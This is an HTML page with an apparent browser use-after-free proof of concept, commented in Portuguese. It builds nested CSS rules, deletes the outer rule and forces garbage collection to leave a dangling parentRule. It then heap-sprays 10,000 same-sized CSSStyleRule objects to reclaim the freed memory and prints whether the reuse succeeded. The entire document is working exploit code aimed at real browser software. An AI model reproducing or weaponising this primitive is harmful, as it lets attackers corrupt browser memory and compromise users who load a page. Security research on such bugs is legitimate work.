<!DOCTYPE html>
<html>
<body>
<script>
function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = {i: "ab" + i + (i / 100000)};
        temp += "foo";
        gcRec(n-1);
    }
    for (var i = 0; i < 10000; i++)
        gcRec(10);
}

// Fase 1: UAF setup
const style = document.createElement("style");
document.head.appendChild(style);
const sheet = style.sheet;
sheet.insertRule(".outer { color: red; & .nested { color: blue; } }", 0);

let nestedRules = sheet.cssRules[0].cssRules;
sheet.deleteRule(0);
gc();

const nested = nestedRules[0];
nestedRules = null;
gc();  // Aqui o outer CSSStyleRule C++ é freed

// Fase 2: Capturar dangling ANTES do spray
let danglingParent = nested.parentRule;
let beforeSpray = danglingParent ? danglingParent.selectorText : "null";
document.write("Before: " + beforeSpray + "<br>"); // Esperado: .outer

// Fase 3: Spray com mesmo tipo (CSSStyleRule ~96 bytes, mesmo bucket)
let spraySheets = [];
for (let i = 0; i < 10000; i++) {
    let el = document.createElement("style");
    document.head.appendChild(el);
    // Mesmo tipo que o freed → mesmo size class → pode reusar o chunk
    el.sheet.insertRule(".SPRAYED_" + i + " { color: red; & .n { color: blue; } }", 0);
    el.sheet.cssRules[0]; // Força criação do wrapper C++ CSSStyleRule
    spraySheets.push(el);
}

// Fase 4: Verificar reuso
let afterSpray = danglingParent ? danglingParent.selectorText : "null";
document.write("After: " + afterSpray + "<br>");
if (beforeSpray !== afterSpray) {
    document.write("HEAP REUSE CONFIRMED: '" + beforeSpray + "' → '" + afterSpray + "'<br>");
    document.write("UAF: lendo objeto diferente no mesmo endereço");
}
</script>
</body>
</html>
